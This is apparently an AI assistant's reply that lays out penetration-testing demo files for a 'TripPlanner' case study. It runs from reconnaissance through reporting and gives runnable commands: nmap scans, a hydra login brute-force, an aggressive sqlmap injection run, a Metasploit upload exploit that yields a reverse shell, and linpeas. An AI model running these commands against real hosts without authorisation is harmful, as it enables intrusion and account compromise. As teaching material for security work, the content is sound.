Perfect — here’s the full content for `📁 usage-demos/`, covering all the tools we mentioned earlier, organized by penetration testing phase.

---

### 📁 `usage-demos/`

Each folder contains a **README.md** with a usage example tied to the **TripPlanner** case study.

#### ├── **reconnaissance/**

> Tools: `nmap`, `whois`, `theHarvester`

* **nmap-tripplanner.md**

```bash
nmap -A -T4 tripplanner.io
nmap -sV -p- 10.1.10.25
```

*Nmap revealed open ports 22, 80, 443 and a misconfigured internal CMS interface on port 8080.*

* **theharvester-tripplanner.md**

```bash
theHarvester -d tripplanner.io -b google
```

*Collected 12 emails from travel blogs and partner listings.*

---

#### ├── **scanning/**

> Tools: `nikto`, `wpscan`, `sslscan`

* **nikto-tripplanner.md**

```bash
nikto -h https://tripplanner.io
```

*Discovered X-Frame-Options missing and outdated server banner.*

* **sslscan-tripplanner.md**

```bash
sslscan tripplanner.io
```

*Weak ciphers detected: TLS\_RSA\_WITH\_3DES\_EDE\_CBC\_SHA.*

---

#### ├── **gaining-access/**

> Tools: `burpsuite`, `hydra`, `sqlmap`

* **hydra-tripplanner.md**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt tripplanner.io http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

*Successful login to test admin portal with weak credentials.*

* **sqlmap-tripplanner.md**

```bash
sqlmap -u "https://api.tripplanner.io/search?id=2" --batch --risk=3 --level=5
```

*SQL injection vulnerability detected in the API endpoint.*

---

#### ├── **maintaining-access/**

> Tools: `Metasploit`, `reverse shell`, `msfvenom`

* **metasploit-tripplanner.md**

```bash
use exploit/unix/webapp/php_upload_bypass
set RHOST 10.1.10.25
exploit
```

*File upload vulnerability exploited to gain reverse shell.*

---

#### ├── **privilege-escalation/**

> Tools: `linpeas.sh`, `pspy`, `crontab`

* **linpeas-tripplanner.md**

```bash
./linpeas.sh
```

*Found cron job running `backup.sh` as root with insecure write permissions.*

---

#### ├── **reporting/**

> Tools: `CherryTree`, `Dradis`, `Markdown`

* **cherrytree-tripplanner.ctd**

> Contains the exported case notes and screenshot paths.

* **dradis-reporting.md**

```bash
dradis create project tripplanner-2025
dradis upload evidence tripplanner-cms-shell.txt
```

---

Would you like me to zip the folder structure or help generate a GitHub README structure for all this now?
